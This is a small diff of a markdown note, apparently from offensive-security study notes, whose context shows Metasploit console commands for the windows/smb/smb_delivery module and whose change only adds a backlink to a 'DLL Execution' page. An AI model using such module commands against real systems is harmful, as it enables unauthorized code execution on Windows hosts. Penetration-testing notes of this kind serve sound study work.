@@ -45,3 +45,10 @@ msf exploit(windows/smb/smb_delivery) > set srvport <server_PORT>
 
 msf exploit(windows/smb/smb_delivery) > run -j
 ```
+
+---
+## References
+
+### Backlinks
+
+- [[DLL Execution]]
